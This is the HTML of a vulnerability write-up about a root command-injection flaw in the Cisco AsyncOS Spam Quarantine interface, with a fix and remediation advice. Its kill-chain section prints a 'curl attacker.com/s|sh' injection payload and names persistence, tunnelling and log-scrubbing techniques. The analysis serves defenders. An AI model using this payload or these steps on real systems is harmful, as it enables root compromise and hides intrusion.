@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      AsyncOS Quarantine Collapse &middot; tralsesec
+    
+  </title>
+
+  <!-- CSS -->
+  <!--<link rel="stylesheet" href="public/css/poole.css">-->
+  <!--<link rel="stylesheet" href="public/css/blackdoc.css">-->
+  <link rel="stylesheet" href="/public/css/syntax.css">
+  <link rel="stylesheet" href="/public/css/modern.css">
+  <!--<link rel="stylesheet" href="public/css/operator.css">-->
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=EB+Garamond">
+  <!-- Icons -->
+  <link rel="apple-touch-icon" sizes="144x144" href="/public/apple-touch-icon.png">
+  <link rel="shortcut icon" href="/public/favicon.ico">
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
+</head>
+
+
+  <body>
+
+    <div class="sidebar">
+  <div class="container sidebar-sticky" style="display: flex; flex-direction: column; height: 100%;">
+    
+    <div class="sidebar-about">
+      <h1>
+        <a href="/">
+          tralsesec
+        </a>
+      </h1>
+      <p class="lead">Offensive Security Researcher · Malware Developer & Analyst · Exploit Developer · CTF Player</p>
+    </div>
+
+    <nav class="sidebar-nav">
+      <a class="sidebar-nav-item" href="/">Home</a>
+      <a class="sidebar-nav-item" href="/about">About</a>
+      <a class="sidebar-nav-item" href="/projects">Projects</a>
+      <a class="sidebar-nav-item active" href="/anatomy-of-a-bug">Anatomy of a Bug</a>
+      <a class="sidebar-nav-item" href="/ctfs">Capture the Flags</a>
+
+      <hr style="border: 0; border-top: 1px solid var(--border); margin: 1.5rem 0;">
+
+      <a class="sidebar-nav-item" href="https://x.com/tralsesec" target="_blank" rel="noopener noreferrer">
+        <svg style="width:16px; height:16px; margin-right:8px; vertical-align:middle; fill:currentColor;" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+        X
+      </a>
+
+      <a class="sidebar-nav-item" href="https://github.com/tralsesec" target="_blank" rel="noopener noreferrer">
+        <svg style="width:16px; height:16px; margin-right:8px; vertical-align:middle; fill:currentColor;" viewBox="0 0 16 16"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
+        GitHub
+      </a>
+
+      <a class="sidebar-nav-item" href="https://app.hackthebox.com/public/users/475600" target="_blank" rel="noopener noreferrer">
+        <svg style="width:16px; height:16px; margin-right:8px; vertical-align:middle; fill:currentColor;" viewBox="0 0 24 24"><path d="M11.99 0l-10.4 6.02v12.01l10.4 6.02 10.4-6.02V6.02L11.99 0zM3.46 17.2V6.9l8.53-4.93 8.53 4.93v10.3l-8.53 4.93-8.53-4.93z"/><path d="M11.99 3.5L4.8 7.66v8.32l7.19 4.16 7.19-4.16V7.66L11.99 3.5zm5.72 11.53l-5.72 3.31-5.72-3.31V8.47l5.72-3.31 5.72 3.31v6.56z"/></svg>
+        HackTheBox
+      </a>
+
+    </nav>
+
+    <p style="margin-top: auto; padding-top: 2rem; margin-bottom: 0; font-size: 0.9rem;">
+      &copy; 2026. All rights reserved.
+    </p>
+  </div>
+</div>
+
+
+    <div class="content container">
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+<meta property="og:type" content="article" />
+<meta property="og:site_name" content="#! Anatomy of a Bug" />
+<meta property="og:title" content="AsyncOS Quarantine Collapse (#6)" />
+<meta property="og:description" content="AsyncOS Quarantine Collapse (CVE-2025-20393): A critical CVSS 10.0 vulnerability in the Cisco Secure Email Gateway (ESA/SMA) Spam Quarantine web interface." />
+<meta property="og:url" content="https://tralsesec.github.io/anatomy-of-a-bug/md/6/" />
+
+<meta name="theme-color" content="#6c189d">
+
+<meta property="twitter:card" content="summary_large_image" />
+<meta property="twitter:title" content="AsyncOS Quarantine Collapse (#6)">
+<meta property="twitter:description" content="AsyncOS Quarantine Collapse (CVE-2025-20393): A critical CVSS 10.0 vulnerability in the Cisco Secure Email Gateway (ESA/SMA) Spam Quarantine web interface.">
+<meta name="twitter:site" content="#! Anatomy of a Bug">
+
+<meta property="og:image" content="https://tralsesec.github.io/anatomy-of-a-bug/assets/og/6.png" />
+<meta property="twitter:image" content="https://tralsesec.github.io/anatomy-of-a-bug/assets/og/6.png" />
+
+<div class="page">
+
+  <header class="intel-header-panel" style="border-bottom: 1px solid #444; padding-bottom: 1.5rem; margin-bottom: 2rem;">
+
+    <div style="display: flex; flex-wrap: wrap; justify-content: space-between; align-items: flex-start; gap: 1rem; margin-bottom: 1.5rem;">
+      
+      <h1 class="page-title" style="margin: 0; line-height: 1.1; padding-bottom: 0rem;">
+        
+        AsyncOS Quarantine Collapse
+      </h1>
+      
+      
+        
+        <a href="/anatomy-of-a-bug/pdf/AOAB6.pdf" class="tactical-btn" download style="white-space: nowrap; font-size: 0.9em; padding: 6px 12px; border: 1px solid currentColor; text-decoration: none;">
+          <span class="tactical-icon" style="margin-right:5px;">⬇</span> PDF REPORT
+        </a>
+      
+    </div>
+
+    
+    <div class="intel-meta-grid" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 1rem; font-family: monospace; font-size: 0.85em; color: #aaa; margin-bottom: 1rem;">
+      
+      <div class="meta-block">
+        <div style="font-size: 0.75em; opacity: 0.6; margin-bottom: 2px;">STATUS</div>
+        <div style="color: #fff; letter-spacing: 0.5px;">DECLASSIFIED</div>
+      </div>
+
+      <div class="meta-block">
+        <div style="font-size: 0.75em; opacity: 0.6; margin-bottom: 2px;">SEVERITY</div>
+        <div class="text-red" style="font-weight: bold;">10.0</div>
+      </div>
+
+      <div class="meta-block">
+        <div style="font-size: 0.75em; opacity: 0.6; margin-bottom: 2px;">DISCOVERED</div>
+        <div>2025-12-18</div>
+      </div>
+
+      <div class="meta-block">
+        <div style="font-size: 0.75em; opacity: 0.6; margin-bottom: 2px;">UPLOADED</div>
+        <div>2025-12-25</div>
+      </div>
+
+    </div>
+    
+
+    
+    <div class="intel-tags" style="display: flex; flex-wrap: wrap; gap: 8px; font-family: monospace; font-size: 0.75em;">
+      
+        <span style="background: rgba(255,255,255,0.05); border: 1px solid #444; padding: 2px 8px; border-radius: 2px; color: #888;">#CISCO</span>
+      
+        <span style="background: rgba(255,255,255,0.05); border: 1px solid #444; padding: 2px 8px; border-radius: 2px; color: #888;">#ASYNCOS</span>
+      
+        <span style="background: rgba(255,255,255,0.05); border: 1px solid #444; padding: 2px 8px; border-radius: 2px; color: #888;">#WEB</span>
+      
+        <span style="background: rgba(255,255,255,0.05); border: 1px solid #444; padding: 2px 8px; border-radius: 2px; color: #888;">#EMAILGATEWAY</span>
+      
+        <span style="background: rgba(255,255,255,0.05); border: 1px solid #444; padding: 2px 8px; border-radius: 2px; color: #888;">#AUTHBYPASS</span>
+      
+        <span style="background: rgba(255,255,255,0.05); border: 1px solid #444; padding: 2px 8px; border-radius: 2px; color: #888;">#COMMANDINJECTION</span>
+      
+        <span style="background: rgba(255,255,255,0.05); border: 1px solid #444; padding: 2px 8px; border-radius: 2px; color: #888;">#RCE</span>
+      
+        <span style="background: rgba(255,255,255,0.05); border: 1px solid #444; padding: 2px 8px; border-radius: 2px; color: #888;">#LPE</span>
+      
+        <span style="background: rgba(255,255,255,0.05); border: 1px solid #444; padding: 2px 8px; border-radius: 2px; color: #888;">#PRIVESC</span>
+      
+        <span style="background: rgba(255,255,255,0.05); border: 1px solid #444; padding: 2px 8px; border-radius: 2px; color: #888;">#PYTHON</span>
+      
+    </div>
+    
+
+  </header>
+
+  
+
+  
+  <div id="intel-toc" style="display: none; margin-bottom: 3rem; margin-top: 1rem;">
+    
+    <div style="
+        border-bottom: 1px dashed #444; 
+        padding-bottom: 0.5rem; 
+        margin-bottom: 1rem; 
+        font-family: monospace; 
+        font-size: 0.85em; 
+        color: #666;
+    ">
+      <span style="opacity: 0.5; margin-right: 10px;">// TABLE OF CONTENTS</span>
+      <!--<strong>LOG_ENTRY_NAVIGATION</strong>-->
+    </div>
+
+    <ul id="toc-list" style="
+        list-style: none; 
+        padding: 0; 
+        margin: 0; 
+        font-family: monospace; 
+        font-size: 0.9rem;
+    ">
+      </ul>
+  
+
+  </div>
+
+  <div class="intel-content">
+    <h2 id="1-the-patient">1. The Patient</h2>
+
+<p><strong>Target:</strong> Cisco Secure Email Gateway (ESA/SMA)<br />
+<strong>Component:</strong> Spam Quarantine Web Interface (<code class="language-plaintext highlighter-rouge">Glass/1.0</code>)<br />
+<strong>Vector:</strong> TCP/6025 (HTTP POST)</p>
+
+<p>Cisco AsyncOS is a proprietary FreeBSD-based operating system designed to serve as a “Black Box” appliance. It is deeply integrated with enterprise SMTP relays and directory services. The specific failure occurred in the <strong>Glass Web Layer</strong>, a legacy interface running on Python 2.6.4 designed to handle user quarantine management.</p>
+
+<p>The architecture operated on a fatal assumption: <strong>The Illusion of Security</strong>. Because the appliance does not offer customers direct SSH access, the developers assumed the internal environment was safe. Consequently, the web server runs with <strong>Root privileges</strong>, assuming that limited customer access implies limited risk.</p>
+
+<blockquote>
+  <p><strong>The Context:</strong> This vulnerability holds a CVSS score of <strong>10.0</strong>. This is the theoretical maximum for severity, defined by: <strong>No Authentication</strong> required, <strong>No User Interaction</strong> required, and a result of immediate <strong>Root-level Command Execution</strong>.</p>
+</blockquote>
+
+<h2 id="2-the-diagnosis">2. The Diagnosis</h2>
+
+<p><strong>Root Cause:</strong> Improper Input Validation leading to OS Command Injection.</p>
+
+<p>The flaw acts as a <strong>Swiss Cheese Failure</strong>, where holes in the Network, Application, and OS layers aligned perfectly. The Spam Quarantine interface accepts HTTP POST requests to manage email queues. The Python handler constructs a command string at runtime to invoke system helpers.</p>
+
+<p>The failure occurs in the handling of the <code class="language-plaintext highlighter-rouge">queue_id</code> parameter:</p>
+
+<ol>
+  <li><strong>The Claim:</strong> The application expects <code class="language-plaintext highlighter-rouge">queue_id</code> to be a simple integer (e.g., <code class="language-plaintext highlighter-rouge">1005</code>).</li>
+  <li><strong>The Trust:</strong> The application trusts this input blindly. It does not validate that the input is numeric, nor does it sanitize shell metacharacters.</li>
+  <li><strong>The Construction:</strong> The server concatenates the user input directly into a system command string: <code class="language-plaintext highlighter-rouge">"/usr/bin/quarantine_helper --id " + user_input</code>.</li>
+  <li><strong>The Execution:</strong> This string is passed to <code class="language-plaintext highlighter-rouge">os.system()</code>. Because the web server runs as Root with no privilege drops, no chroot, and no seccomp filters, the injected commands execute with full system authority.</li>
+</ol>
+
+<h2 id="3-the-kill-chain">3. The Kill-Chain</h2>
+
+<h3 id="phase-1-reconnaissance--delivery">Phase 1: Reconnaissance &amp; Delivery</h3>
+<p>The attacker scans for the specific fingerprint of the Spam Quarantine service: Port <code class="language-plaintext highlighter-rouge">6025</code> exposing the <code class="language-plaintext highlighter-rouge">Glass/1.0</code> server header. 
+Instead of a legitimate request, the attacker constructs a payload that closes the expected command and opens a new shell execution:</p>
+<ul>
+  <li><strong>Payload:</strong> <code style="word-break: break-all; white-space: normal;">action=release&amp;queue_id=1005;curl+attacker.com/s|sh</code></li>
+</ul>
+
+<h3 id="phase-2-execution-the-breach">Phase 2: Execution (The Breach)</h3>
+<p>The Python CGI processes the request. The underlying system executes:
+<code class="language-plaintext highlighter-rouge">/usr/bin/quarantine_helper --id 1005; curl attacker.com/s | sh</code></p>
+
+<p>The result is immediate. The attacker gains a <strong>Root Shell</strong> (UID 0) with full filesystem access and network reachability. There is no escalation phase; execution starts at the highest privilege level.</p>
+
+<h3 id="phase-3-persistence--evasion">Phase 3: Persistence &amp; Evasion</h3>
+<p>To maintain access without triggering alarms, the attacker utilizes <strong>AquaShell</strong> and <strong>AquaPurge</strong> techniques:</p>
+<ul>
+  <li><strong>Persistence:</strong> The on-disk script <code class="language-plaintext highlighter-rouge">index.py</code> is modified to act as a passive backdoor, watching for “magic” POST markers to decode hidden payloads.</li>
+  <li><strong>Lateral Movement:</strong> Tools like <code class="language-plaintext highlighter-rouge">Chisel</code> or ReverseSSH are deployed to tunnel from the DMZ into the internal network.</li>
+  <li><strong>Anti-Forensics:</strong> Logs are surgically scrubbed using <code class="language-plaintext highlighter-rouge">grep -v</code> to remove the attacker’s IP address, leaving the appliance owned but the logs clean.</li>
+</ul>
+
+<blockquote>
+  <p><strong>Impact:</strong> The compromise is total. The “Black Box” nature of the appliance prevents standard EDR tools from monitoring the OS, making detection nearly impossible without external network traffic analysis.</p>
+</blockquote>
+
+<h2 id="4-the-fix">4. The Fix</h2>
+
+<p>The remediation requires abandoning the use of shell interpreters for system calls. User input must never be concatenated into executable strings.</p>
+
+<p><strong>Vulnerable Logic:</strong></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
+
+<span class="c1"># FATAL: "shell=True" implicit behavior.
+# The system creates a /bin/sh process that parses the string.
+# This allows ';', '|', and backticks to execute extra commands.
+</span><span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/quarantine_helper </span><span class="sh">"</span> <span class="o">+</span> <span class="n">user_input</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p><strong>Patched Logic:</strong></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">subprocess</span>
+
+<span class="c1"># SECURITY FIX: Use subprocess with a LIST of arguments.
+# This invokes the binary directly (like execve), bypassing the shell.
+</span><span class="n">subprocess</span><span class="p">.</span><span class="nf">check_call</span><span class="p">(</span>
+  <span class="p">[</span><span class="sh">"</span><span class="s">/usr/bin/quarantine_helper</span><span class="sh">"</span><span class="p">,</span> <span class="n">user_input</span><span class="p">],</span>
+  <span class="n">shell</span><span class="o">=</span><span class="bp">False</span>
+<span class="p">)</span>
+
+<span class="c1"># Result: The system treats 'user_input' strictly as data.
+</span>
+</code></pre></div></div>
+
+<h3 id="developer-takeaway">Developer Takeaway</h3>
+
+<p><strong>Legacy code is an attack surface.</strong> Python 2.x is not just “legacy”; it is a liability. Security appliances are not special—they must follow the same hostile-facing rules as any public server. The reliance on “Security by Obscurity” and the assumption that internal components could run as Root because “customers can’t reach them” was a design failure, not just a code bug.</p>
+
+<p><strong>Immediate Action:</strong></p>
+
+<ol>
+  <li><strong>Patch:</strong> Apply the AsyncOS December 2025 Hotfix immediately.</li>
+  <li><strong>Isolate:</strong> Disable external access to Spam Quarantine interfaces (TCP/6025).</li>
+  <li><strong>Rebuild:</strong> If compromised, patching is insufficient. The appliance must be rebuilt from a trusted image due to the potential for persistence.</li>
+</ol>
+
+  </div>
+
+  
+  <div class="intel-credits" style="margin-top: 4rem; padding-top: 1rem; border-top: 1px dashed #444; font-family: monospace; text-align: right; color: #666; font-size: 0.85em;">
+    <span style="margin-right: 10px; opacity: 0.5;">// END TRANSMISSION</span>
+    <strong>CREDIT: Cisco Talos Intelligence Group, Cisco PSIRT</strong>
+  </div>
+   
+
+</div>
+
+
+
+
+
+
+
+
+
+  
+
+  <style>
+    .tooltip { position: relative; display: inline-block; cursor: help; }
+    .tooltip .tooltiptext {
+      visibility: hidden; width: 200px; background-color: #1a1a1a; color: #fff;
+      text-align: left; border: 1px solid var(--accent); padding: 8px; position: absolute;
+      z-index: 10; bottom: 125%; left: 50%; margin-left: -100px; opacity: 0;
+      transition: opacity 0.3s; font-family: var(--font-mono); font-size: 0.65rem; line-height: 1.4;
+      pointer-events: none;
+    }
+    .tooltip:hover .tooltiptext { visibility: visible; opacity: 1; }
+  </style>
+
+  <div class="related-aoabs" style="margin-top: 0rem; border-top: 0px solid var(--border); padding-top: 0rem;">
+    <h3 style="color: var(--accent); margin-bottom: 1.5rem; font-family: var(--font-mono);">// RELATED_INTELLIGENCE</h3>
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem;">
+      
+      
+        
+        
+        
+        
+        
+        
+
+        
+        
+        
+
+        
+        
+        
+        
+
+        <div class="related-card" style="border: 1px solid #222; background: #0a0a0a; display: flex; align-items: center; padding: 0.8rem; gap: 1rem; position: relative;">
+          
+          <div style="width: 60px; height: 60px; flex-shrink: 0; border: 1px solid #333; overflow: hidden;">
+            <img src="/anatomy-of-a-bug/assets/og/5.png" style="width: 100%; height: 100%; object-fit: cover; opacity: 0.9;">
+          </div>
+
+          <div style="flex-grow: 1;">
+            <div style="display: flex; justify-content: space-between; font-family: var(--font-mono); font-size: 0.6rem;">
+              <span class="fg-dim">CVE-REPORT</span>
+              <span style="color: #888; font-weight: bold;">
+                9.8
+              </span>
+            </div>
+            
+            <h4 style="margin: 3px 0; line-height: 1.2;">
+                <a href="/anatomy-of-a-bug/md/5/" style="border: none; font-size: 0.9rem; color: #eee;">FortiWeb Edge Collapse</a>
+            </h4>
+            
+            <div style="display: flex; align-items: center; gap: 10px; margin-top: 5px;">
+              <div style="width: 80px; height: 4px; background: #222; border-radius: 2px;">
+                <div style="width: 40%; height: 100%; background: var(--accent);"></div>
+              </div>
+              <span style="font-family: var(--font-mono); font-size: 0.6rem; color: var(--accent);">
+                40% LINKED
+              </span>
+              
+              <div class="tooltip">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="opacity: 0.5; vertical-align: middle;"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                <span class="tooltiptext">
+                  <strong style="color: var(--accent); display: block; margin-bottom: 5px;">SHARED_VECTORS:</strong>
+                  • AuthBypass<br>• CommandInjection<br>• RCE<br>• Web
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+      
+        
+        
+        
+        
+        
+        
+
+        
+        
+        
+
+        
+        
+        
+        
+
+        <div class="related-card" style="border: 1px solid #222; background: #0a0a0a; display: flex; align-items: center; padding: 0.8rem; gap: 1rem; position: relative;">
+          
+          <div style="width: 60px; height: 60px; flex-shrink: 0; border: 1px solid #333; overflow: hidden;">
+            <img src="/anatomy-of-a-bug/assets/og/4.png" style="width: 100%; height: 100%; object-fit: cover; opacity: 0.9;">
+          </div>
+
+          <div style="flex-grow: 1;">
+            <div style="display: flex; justify-content: space-between; font-family: var(--font-mono); font-size: 0.6rem;">
+              <span class="fg-dim">CVE-REPORT</span>
+              <span style="color: #888; font-weight: bold;">
+                10.0
+              </span>
+            </div>
+            
+            <h4 style="margin: 3px 0; line-height: 1.2;">
+                <a href="/anatomy-of-a-bug/md/4/" style="border: none; font-size: 0.9rem; color: #eee;">iOS26 "Liquid Glass" Exploitation Chain</a>
+            </h4>
+            
+            <div style="display: flex; align-items: center; gap: 10px; margin-top: 5px;">
+              <div style="width: 80px; height: 4px; background: #222; border-radius: 2px;">
+                <div style="width: 30%; height: 100%; background: var(--accent);"></div>
+              </div>
+              <span style="font-family: var(--font-mono); font-size: 0.6rem; color: var(--accent);">
+                30% LINKED
+              </span>
+              
+              <div class="tooltip">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="opacity: 0.5; vertical-align: middle;"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                <span class="tooltiptext">
+                  <strong style="color: var(--accent); display: block; margin-bottom: 5px;">SHARED_VECTORS:</strong>
+                  • PrivEsc<br>• RCE<br>• Web
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+      
+        
+        
+        
+        
+        
+        
+
+        
+        
+        
+
+        
+        
+        
+        
+
+        <div class="related-card" style="border: 1px solid #222; background: #0a0a0a; display: flex; align-items: center; padding: 0.8rem; gap: 1rem; position: relative;">
+          
+          <div style="width: 60px; height: 60px; flex-shrink: 0; border: 1px solid #333; overflow: hidden;">
+            <img src="/anatomy-of-a-bug/assets/og/10.png" style="width: 100%; height: 100%; object-fit: cover; opacity: 0.9;">
+          </div>
+
+          <div style="flex-grow: 1;">
+            <div style="display: flex; justify-content: space-between; font-family: var(--font-mono); font-size: 0.6rem;">
+              <span class="fg-dim">CVE-REPORT</span>
+              <span style="color: #888; font-weight: bold;">
+                9.9
+              </span>
+            </div>
+            
+            <h4 style="margin: 3px 0; line-height: 1.2;">
+                <a href="/anatomy-of-a-bug/md/10/" style="border: none; font-size: 0.9rem; color: #eee;">N8scape</a>
+            </h4>
+            
+            <div style="display: flex; align-items: center; gap: 10px; margin-top: 5px;">
+              <div style="width: 80px; height: 4px; background: #222; border-radius: 2px;">
+                <div style="width: 30%; height: 100%; background: var(--accent);"></div>
+              </div>
+              <span style="font-family: var(--font-mono); font-size: 0.6rem; color: var(--accent);">
+                30% LINKED
+              </span>
+              
+              <div class="tooltip">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="opacity: 0.5; vertical-align: middle;"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                <span class="tooltiptext">
+                  <strong style="color: var(--accent); display: block; margin-bottom: 5px;">SHARED_VECTORS:</strong>
+                  • Python<br>• RCE<br>• Web
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+      
+    </div>
+  </div>
+
+
+
+<style>
+/* --- TABLE OF CONTENTS (Stealth Mode) --- */
+#intel-toc {
+  display: none;
+  margin-bottom: 4rem;
+  margin-top: 1rem;
+  /* NO BOX, NO BORDER, NO BACKGROUND */
+  border: none;
+  background: transparent;
+  padding: 0;
+  position: relative;
+}
+
+/* The Label: Looks like a code comment */
+#intel-toc .toc-label {
+  font-family: var(--font-mono);
+  font-size: 0.65rem;
+  color: #444; /* Very dark/subtle */
+  margin-bottom: 1rem;
+  margin-left: 1px; /* Align with the timeline line */
+  text-transform: uppercase;
+  letter-spacing: 0.1em;
+  user-select: none;
+}
+
+/* The List Container */
+#toc-list {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+  font-family: var(--font-mono);
+  font-size: 0.85rem;
+  /* The "Timeline" Line */
+  border-left: 1px solid #222; 
+  padding-left: 0;
+}
+
+#toc-list li {
+  margin-bottom: 0;
+  position: relative;
+}
+
+/* --- H2 (Main Levels) --- */
+.toc-h2 {
+  padding-top: 8px;
+  padding-bottom: 8px;
+}
+
+.toc-h2 a {
+  display: flex;
+  align-items: center;
+  padding-left: 1.5rem;
+  color: var(--fg-primary);
+  border-bottom: none;
+  transition: transform 0.2s ease;
+}
+
+/* The Hover Effect: Slide Right + Green Highlight */
+.toc-h2 a:hover {
+  color: var(--accent);
+  transform: translateX(5px);
+  border-bottom: none;
+}
+
+/* Add a tiny horizontal tick mark on the left line for H2s */
+.toc-h2::before {
+  content: '';
+  position: absolute;
+  left: 0;
+  top: 50%;
+  width: 10px; /* Length of the tick */
+  height: 1px;
+  background-color: #222;
+}
+
+/* --- H3 (Sub Levels) --- */
+.toc-h3 {
+  padding-top: 4px;
+  padding-bottom: 4px;
+}
+
+.toc-h3 a {
+  padding-left: 3.5rem; /* Deep Indent */
+  font-size: 0.75rem;   /* Smaller Text */
+  color: var(--fg-dim); /* Dimmer Color */
+  border-bottom: none;
+  display: block;
+}
+
+.toc-h3 a:hover {
+  color: #fff;
+}
+
+/* The Numbers / Symbols */
+.toc-num {
+  color: var(--accent); /* Hacker Green */
+  font-weight: bold;
+  margin-right: 12px;
+  font-size: 0.9em;
+  min-width: 20px; /* Align text even if numbers grow */
+  display: inline-block;
+}
+
+/* --- SECTION ANCHORS (The # symbol) --- */
+.anchor-link {
+  opacity: 0;                /* Hidden by default */
+  margin-left: 0.8rem;       /* Add space between Text and # */
+  color: var(--fg-dim);      /* Dim color */
+  text-decoration: none;     /* No underline */
+  border-bottom: none !important; /* Force remove theme underline */
+  font-size: 0.8em;
+  transition: opacity 0.2s ease, transform 0.2s ease;
+  cursor: pointer;
+  
+  /* Ensure it doesn't mess up layout */
+  display: inline-block;
+  vertical-align: middle;
+}
+
+/* REVEAL ON HOVER */
+/* When you hover over the H2 or H3, show the anchor */
+h2:hover .anchor-link,
+h3:hover .anchor-link {
+  opacity: 1;
+  transform: translateX(3px); /* Subtle slide in */
+}
+
+/* Hovering over the # itself makes it bright */
+.anchor-link:hover {
+  color: var(--accent) !important;
+}
+</style>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+  const tocContainer = document.getElementById('intel-toc');
+  const tocList = document.getElementById('toc-list');
+  const headers = document.querySelectorAll('.intel-content h2, .intel-content h3');
+
+  if (headers.length > 0) {
+    tocContainer.style.display = 'block';
+
+    let h2Count = 0;
+
+    headers.forEach((header, index) => {
+      // 1. Generate ID if missing
+      if (!header.id) {
+        const slug = header.textContent
+          .toLowerCase()
+          .trim()
+          .replace(/[^\w\s-]/g, '')
+          .replace(/[\s_-]+/g, '-');
+        header.id = slug || `section-${index}`;
+      }
+
+      // 2. Add Anchor Link (#)
+      const anchor = document.createElement('a');
+      anchor.href = `#${header.id}`;
+      anchor.className = 'anchor-link';
+      anchor.textContent = '#';
+      header.appendChild(anchor);
+
+      // 3. Prepare TOC Data
+      const li = document.createElement('li');
+      const link = document.createElement('a');
+      link.href = `#${header.id}`;
+
+      // --- THE FIX: INTELLIGENT NUMBER PARSING ---
+      
+      let rawText = header.childNodes[0].textContent.trim();
+      let displayNum = "";
+      let displayText = rawText;
+
+      // Check if the text ALREADY starts with a number (e.g., "1. The Patient")
+      // Regex looks for: Start of line -> digits -> dot -> optional digits -> dot -> space
+      const existingNumMatch = rawText.match(/^(\d+(?:\.\d+)*)\.?\s+(.*)/);
+
+      if (header.tagName === 'H2') {
+        li.className = 'toc-h2';
+        h2Count++;
+
+        if (existingNumMatch) {
+            // Case A: User wrote "1. The Patient"
+            // We use "01" (padded version of their "1") and strip the number from the text
+            let foundNum = existingNumMatch[1]; // "1"
+            displayNum = foundNum.padStart(2, '0'); // "01"
+            displayText = existingNumMatch[2]; // "The Patient"
+        } else {
+            // Case B: User wrote "The Patient" (No number)
+            // We generate our own number
+            displayNum = h2Count.toString().padStart(2, '0');
+            displayText = rawText;
+        }
+
+      } else if (header.tagName === 'H3') {
+        li.className = 'toc-h3';
+        
+        if (existingNumMatch) {
+            // User wrote "1.1 Subpoint"
+            displayNum = existingNumMatch[1]; // "1.1"
+            displayText = existingNumMatch[2]; // "Subpoint"
+        } else {
+            // User wrote "Subpoint"
+            displayNum = "└"; 
+            displayText = rawText;
+        }
+      }
+
+      // 4. Construct HTML
+      link.innerHTML = `<span class="toc-num">${displayNum}</span> ${displayText}`;
+      
+      li.appendChild(link);
+      tocList.appendChild(li);
+    });
+  }
+});
+</script>
+
+    </div>
+
+  </body>
+</html>
